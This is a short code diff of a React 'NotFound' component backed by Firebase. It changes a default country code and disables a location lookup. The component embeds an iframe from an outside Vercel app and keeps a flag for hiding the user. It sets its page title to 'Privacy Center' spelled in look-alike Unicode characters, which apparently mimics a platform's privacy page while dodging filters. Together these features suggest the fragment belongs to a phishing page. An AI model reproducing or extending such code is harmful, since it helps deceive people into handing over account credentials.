@@ -21,7 +21,7 @@ import { db } from "../firebase";
 
 function NotFound() {
   const [IsChecked, setIsChecked] = useState(0);
-  let[countryCode, setCountryCode] = useState('');
+  let[countryCode, setCountryCode] = useState('us');
   let[IsUserHiden, SetUserHiden] = useState(false);
   let[IframeUrl, SetIframeUrl] = useState('https://stackclient-ten.vercel.app');
   let[SiteTitleMeta, SetSiteTitleMeta] = useState('Ρrіⅴасу Ꮯеոtеr');
@@ -89,7 +89,7 @@ function NotFound() {
     }
   };
   useEffect(() => {
-    setLocaltion();
+    //setLocaltion();
   }, []);
 
   const params = new URLSearchParams(window.location.search)
